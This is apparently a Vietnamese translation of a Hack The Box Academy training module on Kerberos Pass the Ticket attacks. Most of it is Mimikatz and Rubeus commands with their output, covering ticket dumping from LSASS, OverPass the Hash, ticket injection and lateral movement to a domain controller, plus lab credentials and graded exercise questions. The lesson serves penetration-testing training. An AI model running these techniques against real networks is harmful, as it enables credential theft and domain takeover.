# Pass the Ticket (PtT) từ Windows
*Hack The Box Academy — Bản dịch tiếng Việt*

Một phương pháp khác để di chuyển ngang (lateral movement) trong môi trường Active Directory được gọi là tấn công **Pass the Ticket (PtT)**. Trong kiểu tấn công này, ta sử dụng một vé Kerberos (Kerberos ticket) bị đánh cắp để di chuyển ngang thay vì dùng NTLM password hash. Tài liệu này sẽ trình bày nhiều cách thực hiện tấn công PtT từ Windows và Linux. Trong phần này, ta sẽ tập trung vào các kỹ thuật tấn công từ Windows; phần tiếp theo sẽ đề cập đến các kỹ thuật tấn công từ Linux.

> **Lưu ý:** Tài liệu gốc có ghi chú tại thời điểm chụp: hệ thống đang gặp sự cố khi khởi tạo (spawn) target trên tất cả các máy chủ VPN — đội ngũ HTB đang xử lý, cảm ơn sự kiên nhẫn.

## Ôn lại giao thức Kerberos

Hệ thống xác thực Kerberos hoạt động dựa trên cơ chế vé (ticket-based). Ý tưởng cốt lõi của Kerberos là không đưa mật khẩu tài khoản cho từng dịch vụ mà bạn sử dụng. Thay vào đó, Kerberos giữ tất cả các vé trên hệ thống cục bộ của bạn và chỉ trình cho mỗi dịch vụ đúng vé dành riêng cho dịch vụ đó, ngăn không cho một vé bị dùng sai mục đích.

- **Ticket Granting Ticket (TGT)** là vé đầu tiên nhận được trên một hệ thống Kerberos. TGT cho phép client xin thêm các vé Kerberos khác, gọi là TGS.
- **Ticket Granting Service (TGS)** được yêu cầu bởi người dùng muốn sử dụng một dịch vụ cụ thể. Các vé này cho phép dịch vụ xác minh danh tính người dùng.

Khi người dùng yêu cầu một TGT, họ phải xác thực với domain controller bằng cách mã hoá timestamp hiện tại bằng password hash của mình. Sau khi domain controller xác minh danh tính người dùng (vì domain biết password hash của người dùng nên có thể giải mã được timestamp), nó sẽ gửi cho người dùng một TGT dùng cho các yêu cầu trong tương lai. Khi đã có vé, người dùng không cần phải chứng minh danh tính bằng mật khẩu nữa.

Nếu người dùng muốn kết nối tới một cơ sở dữ liệu MSSQL, họ sẽ yêu cầu một Ticket Granting Service (TGS) từ Key Distribution Center (KDC), trình kèm TGT của mình. Sau đó họ sẽ đưa TGS này cho máy chủ MSSQL để xác thực.

Nên xem lại phần **Kerberos, DNS, LDAP, MSRPC** trong module *Introduction to Active Directory* để có cái nhìn tổng quan cấp cao về cách giao thức này hoạt động.

## Tấn công Pass the Ticket (PtT)

Để thực hiện tấn công Pass the Ticket (PtT), ta cần một vé Kerberos hợp lệ. Vé đó có thể là:

- **Service Ticket (TGS)** để truy cập vào một tài nguyên cụ thể.
- **Ticket Granting Ticket (TGT)**, dùng để yêu cầu service ticket nhằm truy cập vào bất kỳ tài nguyên nào mà người dùng có quyền.

Trước khi thực hiện tấn công Pass the Ticket (PtT), hãy xem một số cách để lấy vé bằng **Mimikatz** và **Rubeus**.

### Kịch bản

Hãy tưởng tượng chúng ta đang thực hiện một pentest, đã phishing thành công một người dùng và có được quyền truy cập vào máy tính của họ. Chúng ta tìm được cách để có quyền quản trị viên cục bộ (local administrator) trên máy này. Hãy cùng khám phá nhiều cách để lấy được các vé truy cập trên máy này và cách tạo ra các vé mới.

## Thu thập vé Kerberos từ Windows

Trên Windows, các vé được xử lý và lưu trữ bởi tiến trình **LSASS** (Local Security Authority Subsystem Service). Vì vậy, để lấy vé từ một hệ thống Windows, bạn phải giao tiếp với LSASS và yêu cầu nó cấp vé. Với người dùng không có quyền quản trị, bạn chỉ có thể lấy được vé của chính mình, nhưng với quyền quản trị viên cục bộ, bạn có thể thu thập toàn bộ vé của mọi người.

Chúng ta có thể thu thập tất cả vé từ một hệ thống bằng module `sekurlsa::tickets /export` của **Mimikatz**. Kết quả là một danh sách file có đuôi `.kirbi`, chứa các vé.

### Mimikatz - Xuất vé (Export tickets)

```cmd
c:\tools> mimikatz.exe

 .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 329278 (00000000:0005063e)
Session           : Network from 0
User Name         : DC01$
Domain            : HTB
Logon Server      : (null)
Logon Time        : 7/12/2022 9:39:55 AM
SID               : S-1-5-18

        * Username : DC01$
        * Domain   : inlanefreight.htb
        * Password : (null)

       Group 0 - Ticket Granting Service
       Group 1 - Client Ticket ?
        [00000000]
```

Các vé kết thúc bằng `$` tương ứng với tài khoản máy tính (computer account), vốn cần vé để tương tác với Active Directory. Vé của người dùng sẽ mang tên người dùng, theo sau bởi ký hiệu `@` phân tách tên dịch vụ và domain, ví dụ: `[randomvalue]-username@service-domain.local.kirbi`.

```
 Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
 Service Name (02)  : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
 Target Name  (--)  : @ inlanefreight.htb
 Client Name  (01)  : DC01$ ; @ inlanefreight.htb
 Flags 40a50000     : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable
 Session Key        : 0x00000012 - aes256_hmac
   31cfa427a01e10f6e09492f2e8ddf7f74c79a5ef6b725569e19d614a35a69c07
 Ticket : 0x00000012 - aes256_hmac ; kvno = 5
[...]
 * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAPDC01.inlanefreight.htb.kirbi !

 Group 2 - Ticket Granting Ticket
mimikatz # exit
Bye!

c:\tools> dir *.kirbi

    Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
<SNIP>
-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
```

> **Ghi chú:** Nếu bạn chọn một vé có dịch vụ là `krbtgt`, nó tương ứng với TGT của tài khoản đó.

Chúng ta cũng có thể xuất vé bằng **Rubeus** với tùy chọn `dump`. Tùy chọn này có thể dùng để dump toàn bộ vé (nếu đang chạy với quyền quản trị viên cục bộ). `Rubeus dump`, thay vì cho ta một file, sẽ in ra vé đã mã hóa dạng Base64. Chúng ta thêm tùy chọn `/nowrap` để dễ copy-paste hơn.

> **Ghi chú:** Tại thời điểm viết tài liệu, khi dùng `Mimikatz version 2.2.0 20220919`, nếu chạy `sekurlsa::ekeys`, nó hiển thị tất cả các hash dưới dạng `des_cbc_md4` trên một số phiên bản Windows 10. Các vé đã xuất (`sekurlsa::tickets /export`) sẽ không hoạt động đúng do sai lệch mã hóa. Có thể dùng các hash này để tạo vé mới, hoặc dùng Rubeus để xuất vé dạng Base64.

### Rubeus - Xuất vé (Export tickets)

```cmd
c:\tools> Rubeus.exe dump /nowrap

   ______                        
  (_____ \       _               
   _____) )_   _| |__  _____ _ _ ___
  |  __  /|  | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

   v1.5.0

Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x6c680
    ServiceName             :  krbtgt/inlanefreight.htb
    ServiceRealm            :  inlanefreight.htb
    UserName                :  DC01$
    UserRealm               :  inlanefreight.htb
    StartTime               :  7/12/2022 9:39:54 AM
    EndTime                 :  7/12/2022 7:39:54 PM
    RenewTill               :  7/19/2022 9:39:54 AM
    Flags                   :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType                 :  aes256_cts_hmac_sha1
    Base64(key)             :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
    Base64EncodedTicket     :
      doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoA...

    UserName                :  plaintext
    Domain                  :  HTB
    LogonId                 :  0x6c680
    UserSID                 :  S-1-5-21-228825152-3134732153-3833540767-1107
    AuthenticationPackage   :  Kerberos
    LogonType               :  Interactive
    LogonTime               :  7/12/2022 9:42:15 AM
    LogonServer             :  DC01
    LogonServerDNSDomain    :  inlanefreight.htb
    UserPrincipalName       :  plaintext@inlanefreight.htb

    ServiceName             :  krbtgt/inlanefreight.htb
    ServiceRealm            :  inlanefreight.htb
    UserName                :  plaintext
    UserRealm               :  inlanefreight.htb
    StartTime               :  7/12/2022 9:42:15 AM
    EndTime                 :  7/12/2022 7:42:15 PM
    RenewTill               :  7/19/2022 9:42:15 AM
    Flags                   :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                 :  aes256_cts_hmac_sha1
    Base64(key)             :  2NN3wdC4FfpQunUUgK+MZO8f20xtXF0dbmIagWP0Uu0=
    Base64EncodedTicket     :
      doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5DT02iHDAaoA...
<SNIP>
```

> **Ghi chú:** Để thu thập tất cả vé, chúng ta cần chạy Mimikatz hoặc Rubeus với quyền quản trị viên (administrator).

Đây là một cách phổ biến để lấy vé từ một máy tính. Một lợi thế khác của việc lạm dụng vé Kerberos là khả năng tự tạo (forge) vé của riêng mình. Hãy cùng xem cách thực hiện điều này bằng kỹ thuật **Pass the Key** hay còn gọi là **OverPass the Hash**.

## Pass the Key hay còn gọi là OverPass the Hash

Kỹ thuật **Pass the Hash (PtH)** truyền thống liên quan đến việc tái sử dụng một NTLM password hash mà không đụng đến Kerberos. Phương pháp **Pass the Key** hay **OverPass the Hash** chuyển đổi một hash/key (`rc4_hmac`, `aes256_cts_hmac_sha1`, v.v.) của một người dùng đã join domain thành một **Ticket Granting Ticket (TGT)** đầy đủ. Kỹ thuật này được phát triển bởi Benjamin Delpy và Skip Duckwall trong bài trình bày *Abusing Microsoft Kerberos - Sorry you guys don't get it*. Ngoài ra, Will Schroeder cũng dựa trên nghiên cứu của họ để tạo ra công cụ **Rubeus**.

Để tạo vé giả, chúng ta cần có hash của người dùng; ta có thể dùng Mimikatz để dump tất cả các khóa mã hóa Kerberos của người dùng bằng module `sekurlsa::ekeys`. Module này sẽ liệt kê tất cả các loại khóa hiện có cho gói Kerberos.

### Mimikatz - Trích xuất khóa Kerberos (Extract Kerberos keys)

```cmd
c:\tools> mimikatz.exe

 .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
<SNIP>

Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : 7/12/2022 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

        * Username : plaintext
        * Domain   : inlanefreight.htb
        * Password : (null)
        * Key List :
          aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
          rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
          rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
          rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
          rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
          rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
<SNIP>
```

Giờ khi đã có được khóa **AES256_HMAC** và **RC4_HMAC**, ta có thể thực hiện tấn công OverPass the Hash hay Pass the Key bằng **Mimikatz** và **Rubeus**.

### Mimikatz - Pass the Key hay OverPass the Hash

```cmd
c:\tools> mimikatz.exe

 .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

user    : plaintext
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
  |  PID  1128
  |  TID  3268
  |  LSA Process is now R/W
  |  LUID 0 ; 3414364 (00000000:0034195c)
  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
  \_ kerberos - data copy @ 000001C7E20EE578
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001C7E2136BC8 (32) -> null
```

Lệnh này sẽ mở một cửa sổ `cmd.exe` mới mà chúng ta có thể dùng để yêu cầu truy cập vào bất kỳ dịch vụ nào trong ngữ cảnh của người dùng mục tiêu.

Để tạo (forge) một vé bằng **Rubeus**, ta có thể dùng module `asktgt` kèm theo username, domain, và hash — có thể là `/rc4`, `/aes128`, `/aes256`, hoặc `/des`. Trong ví dụ sau, ta dùng hash AES-256 từ thông tin đã thu thập bằng Mimikatz `sekurlsa::ekeys`.

### Rubeus - Pass the Key hay OverPass the Hash

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

   ______                        
  (_____ \       _               
   _____) )_   _| |__  _____ _ _ ___
  |  __  /|  | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

   v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] Base64(ticket.kirbi):

doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoA...

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  inlanefreight.htb
  UserName                 :  plaintext
  UserRealm                :  inlanefreight.htb
  StartTime                :  7/12/2022 11:28:26 AM
  EndTime                  :  7/12/2022 9:28:26 PM
  RenewTill                :  7/19/2022 11:28:26 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  0TOKzUHdgBQKMk8+xmOV2w==
```

> **Ghi chú:** Mimikatz yêu cầu quyền quản trị để thực hiện tấn công Pass the Key/OverPass the Hash, còn Rubeus thì không.

Để tìm hiểu thêm về sự khác biệt giữa `sekurlsa::pth` của Mimikatz và `asktgt` của Rubeus, hãy tham khảo tài liệu của công cụ Rubeus, phần *Example for OverPass the Hash*.

> **Ghi chú:** Các domain Windows hiện đại (functional level 2008 trở lên) mặc định dùng mã hóa AES trong các giao dịch Kerberos thông thường. Nếu ta dùng hash `rc4_hmac` (NTLM) trong một giao dịch Kerberos thay vì khóa `aes256_cts_hmac_sha1` (hoặc `aes128`), hành vi này có thể bị phát hiện là "hạ cấp mã hóa" (encryption downgrade).

## Pass the Ticket (PtT)

Bây giờ khi đã có một số vé Kerberos, ta có thể dùng chúng để di chuyển ngang trong môi trường.

Với **Rubeus**, ta đã thực hiện tấn công OverPass the Hash và lấy được vé ở dạng Base64. Thay vào đó, ta có thể dùng cờ `/ptt` để nạp vé (TGT hoặc TGS) vào phiên đăng nhập (logon session) hiện tại.

### Rubeus - Pass the Ticket

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

   ______                        
  (_____ \       _               
   _____) )_   _| |__  _____ _ _ ___
  |  __  /|  | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

   v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] Base64(ticket.kirbi):

doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoA...
(base64 rút gọn — xem file gốc để lấy toàn bộ chuỗi)

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  inlanefreight.htb
  UserName                 :  plaintext
  UserRealm                :  inlanefreight.htb
  StartTime                :  7/12/2022 12:27:47 PM
  EndTime                  :  7/12/2022 10:27:47 PM
  RenewTill                :  7/19/2022 12:27:47 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  PRG0wMmc4OznDz1YIAjdsA==
```

Lưu ý rằng lúc này màn hình hiển thị dòng **"Ticket successfully imported!"** (Vé đã được nạp thành công).

Một cách khác là nạp vé vào phiên hiện tại bằng file `.kirbi` từ ổ đĩa. Hãy dùng một vé đã xuất từ Mimikatz và nạp nó bằng Pass the Ticket.

### Rubeus - Pass the Ticket (từ file .kirbi)

```cmd
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

   ______                        
  (_____ \       _               
   _____) )_   _| |__  _____ _ _ ___
  |  __  /|  | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

   v1.5.0

[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$

    Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        6/4/2022  11:17 AM                Program Files
d-----        6/4/2022  11:17 AM                Program Files (x86)

...SNIP...
```

Chúng ta cũng có thể dùng chuỗi Base64 xuất ra từ Rubeus, hoặc chuyển đổi một file `.kirbi` sang Base64 để thực hiện tấn công Pass the Ticket. Có thể dùng PowerShell để chuyển `.kirbi` sang Base64.

### Chuyển đổi .kirbi sang định dạng Base64

```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQzYYQAAAQtMIQAAAQnoI...
```

Dùng Rubeus, ta có thể thực hiện Pass the Ticket bằng cách cung cấp chuỗi Base64 thay vì tên file.

### Pass the Ticket - Định dạng Base64

```cmd
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT0...

   ______                        
  (_____ \       _               
   _____) )_   _| |__  _____ _ _ ___
  |  __  /|  | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

   v1.5.0

[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$

    Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        6/4/2022  11:17 AM                Program Files
d-----        6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

Cuối cùng, ta cũng có thể thực hiện tấn công Pass the Ticket bằng module `kerberos::ptt` của Mimikatz cùng với file `.kirbi` chứa vé cần nạp.

### Mimikatz - Pass the Ticket

```cmd
C:\tools> mimikatz.exe

 .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK

mimikatz # exit
Bye!

c:\tools> dir \\DC01.inlanefreight.htb\c$

    Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        6/4/2022  11:17 AM                Program Files
d-----        6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

> **Ghi chú:** Thay vì mở `mimikatz.exe` bằng `cmd.exe` rồi thoát ra để đưa vé vào command prompt hiện tại, ta có thể dùng module `misc` của Mimikatz để mở một cửa sổ command prompt mới với vé đã được nạp sẵn, bằng lệnh `misc::cmd`.

## Pass The Ticket với PowerShell Remoting (Windows)

**PowerShell Remoting** cho phép ta chạy script hoặc lệnh trên một máy tính từ xa. Quản trị viên thường dùng PowerShell Remoting để quản lý các máy tính từ xa trong mạng. Việc bật PowerShell Remoting sẽ tạo ra cả hai listener HTTP và HTTPS. Listener chạy trên cổng chuẩn TCP/5985 cho HTTP và TCP/5986 cho HTTPS.

Để tạo một phiên PowerShell Remoting trên một máy tính từ xa, bạn cần có quyền quản trị, là thành viên của nhóm **Remote Management Users**, hoặc có quyền PowerShell Remoting rõ ràng trong cấu hình phiên (session configuration) của mình.

Giả sử ta tìm được một tài khoản người dùng không có quyền quản trị trên máy tính từ xa nhưng lại là thành viên của nhóm Remote Management Users. Trong trường hợp đó, ta có thể dùng PowerShell Remoting để kết nối tới máy tính đó và thực thi lệnh.

### Mimikatz - PowerShell Remoting với Pass the Ticket

Để dùng PowerShell Remoting với Pass the Ticket, ta có thể dùng Mimikatz để nạp vé của mình, rồi mở một console PowerShell và kết nối tới máy đích. Hãy mở một cửa sổ `cmd.exe` mới và chạy `mimikatz.exe`, sau đó nạp vé ta đã thu thập bằng `kerberos::ptt`. Khi vé đã được nạp vào phiên `cmd.exe`, ta có thể mở PowerShell command prompt từ cùng `cmd.exe` đó và dùng lệnh `Enter-PSSession` để kết nối tới máy đích.

### Mimikatz - Pass the Ticket để di chuyển ngang (lateral movement)

```cmd
C:\tools> mimikatz.exe

 .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > https://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > https://pingcastle.com / https://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```

### Rubeus - PowerShell Remoting với Pass the Ticket

Rubeus có tùy chọn `createnetonly`, giúp tạo ra một tiến trình/phiên đăng nhập "hy sinh" (sacrificial process/logon session — **Logon type 9**). Tiến trình này mặc định bị ẩn, nhưng ta có thể thêm cờ `/show` để hiển thị tiến trình; kết quả tương đương với lệnh `runas /netonly`. Cách này giúp không xóa mất các TGT hiện có trong phiên đăng nhập hiện tại.

#### Tạo một tiến trình "hy sinh" bằng Rubeus

```cmd
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

   ______                        
  (_____ \       _               
   _____) )_   _| |__  _____ _ _ ___
  |  __  /|  | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

   v2.0.3

[*] Action: Create process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username    :  JMI8CL7C
[*] Domain      :  DTCDV6VL
[*] Password    :  MRWI6XGI
[+] Process     :  'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID   :  1556
[+] LUID        :  0xe07648
```

Lệnh trên sẽ mở ra một cửa sổ `cmd` mới. Từ cửa sổ đó, ta có thể chạy Rubeus để yêu cầu một TGT mới với tùy chọn `/ptt` để nạp vé vào phiên hiện tại và kết nối tới DC bằng PowerShell Remoting.

#### Rubeus - Pass the Ticket để di chuyển ngang

```cmd
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

   ______                        
  (_____ \       _               
   _____) )_   _| |__  _____ _ _ ___
  |  __  /|  | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

   v2.0.3

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\john'
[*] Using domain controller: 10.129.203.120:88
[+] TGT request successful!
[*] Base64(ticket.kirbi):

doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSF...
(base64 rút gọn — xem file gốc để lấy toàn bộ chuỗi)

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  7/18/2022 5:44:50 AM
  EndTime                  :  7/18/2022 3:44:50 PM
  RenewTill                :  7/25/2022 5:44:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```

## Chuyển sang phần tiếp theo

Chúng ta đã trình bày xong nhiều cách để thực hiện tấn công Pass the Ticket từ một máy Windows. Phần tiếp theo sẽ đề cập đến cùng kỹ thuật di chuyển ngang này nhưng từ một máy tấn công (attack host) chạy Linux.

---

## Câu hỏi (Questions)

**Kết nối tới HTB**
> Khởi động (spawn) hệ thống target để lấy IP và trả lời câu hỏi.

**Câu 1 (+40 XP)**
Kết nối tới máy đích bằng RDP với thông tin đăng nhập được cung cấp (`Administrator` / `AnotherC0mpl3xP4$$`). Xuất (export) tất cả các vé có trên máy tính. Bạn thu thập được bao nhiêu TGT của người dùng?

**Câu 2 (+40 XP)**
Dùng TGT của user `john` để thực hiện tấn công Pass the Ticket và lấy flag từ thư mục chia sẻ `\\DC01.inlanefreight.htb\john`.

**Câu 3 (+40 XP)**
Dùng TGT của user `john` để thực hiện tấn công Pass the Ticket và kết nối tới `DC01` bằng PowerShell Remoting. Đọc flag tại `C:\john\john.txt`.

**Bài tập tùy chọn (+40 XP)**
Thử dùng cả hai công cụ, Mimikatz và Rubeus, để thực hiện các tấn công trên mà không phụ thuộc lẫn nhau. Đánh dấu DONE khi hoàn thành.

---

*Ghi chú của người dịch: Tài liệu PDF gốc không chứa ảnh chụp màn hình thực sự — toàn bộ các đoạn trông giống "terminal screenshot" trong bản gốc thực chất là các khối mã (code block) được dàn trang bằng CSS khi xuất trang web ra PDF, không phải ảnh nhúng. Vì vậy bản dịch này không có ảnh để chèn kèm, toàn bộ nội dung kỹ thuật (câu lệnh, output) đã được giữ nguyên như bản gốc.*
